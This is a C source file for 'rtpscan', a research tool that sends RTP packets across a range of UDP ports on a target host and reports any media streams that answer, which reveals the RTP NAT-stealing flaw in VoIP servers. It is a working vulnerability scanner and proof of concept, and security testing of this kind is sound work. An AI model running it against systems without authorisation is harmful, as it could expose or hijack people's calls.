/*
 * Copyright 2017 kapejod, all rights reserved.
 *
 * Scanner for RTP NAT stealing vulnerability, for research / educational purposes only!
 * Works only on big endian machines and ipv4 targets.
 */
 
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <netdb.h>

struct sockaddr_in *create_peer(char *host, int port) {
  struct sockaddr_in *addr = NULL;
  struct hostent *hp = NULL;
  addr = malloc(sizeof(struct sockaddr_in));
  if (!addr) {
    printf("create_peer: unable to malloc peer address\n");
    return NULL;
  }
  memset(addr, 0, sizeof(struct sockaddr_in));
  hp = gethostbyname(host);
  if (!hp) {
    printf("create_peer: unable to resolv host (%s)\n", host);
    free(addr);
    return NULL;
  }

  addr->sin_family = AF_INET;
  addr->sin_port = htons(port);
  bzero(&(addr->sin_zero), 8);
  bcopy(hp->h_addr,(char *)&addr->sin_addr, hp->h_length);
  return addr;
}

void rtp_scan(char *host, int port_range_start, int port_range_end, int ppp, int payload_size, int payload_type) {
  struct sockaddr_in *target;
  struct sockaddr_in sender;
  socklen_t sender_len = sizeof(sender);
  char packet[12 + payload_size];
  char response[512];
  int flags;
  int port;
  int loops;
  int udp_socket;

  target = create_peer(host, port_range_start);
  if (!target) return;

  udp_socket = socket(PF_INET, SOCK_DGRAM, 0);
  if (udp_socket == -1) {
    printf("unable to create udp socket\n");
    free(target);
    return;
  }
  flags = fcntl(udp_socket, F_GETFL);
  fcntl(udp_socket, F_SETFL, flags | O_NONBLOCK);

  memset(&packet, 0, sizeof(packet));
  packet[0] = 0x80; // RTP version 2
  packet[1] = 0x80 | (payload_type & 0x7F); // marker bit set

  printf("scanning %s ports %d to %d with %d packets per port and %d bytes of payload type %d\n", host, port_range_start, port_range_end, ppp, payload_size, payload_type);
  for (port = port_range_start; port < port_range_end; port += 2) {
    target->sin_port = htons(port);
    for (loops = 0; loops < ppp; loops++) {
      packet[3] = loops; // increase seq with every packet
      sendto(udp_socket, &packet, sizeof(packet), 0, (const struct sockaddr *)target, sizeof(struct sockaddr_in));
      usleep((5 + loops) * 1000);

      int bytes_received = recvfrom(udp_socket, &response, sizeof(response), 0, (struct sockaddr *)&sender, &sender_len);
      if (bytes_received >= 12) {
        uint16_t seq = ntohs(response[2]);
        printf("received %d bytes from target port %d, seq %u\n", bytes_received, ntohs(sender.sin_port), seq);
      }
    }
  }
  close(udp_socket);
  free(target);
}

int main(int argc, char *argv[]) {
  int ppp = 4;
  int payload_size = 0;
  int payload_type = 0;
  if (argc < 4) {
    printf("syntax: rtpscan hostname port_range_start port_range_end [packets_per_port] [payload_size] [payload_type]\n");
    return -1;
  }
  if (argc >= 5) ppp = atoi(argv[4]);
  if (argc >= 6) payload_size = atoi(argv[5]);
  if (argc == 7) payload_type = atoi(argv[6]);

  rtp_scan(argv[1], atoi(argv[2]), atoi(argv[3]), ppp, payload_size, payload_type);
  return 0;
}
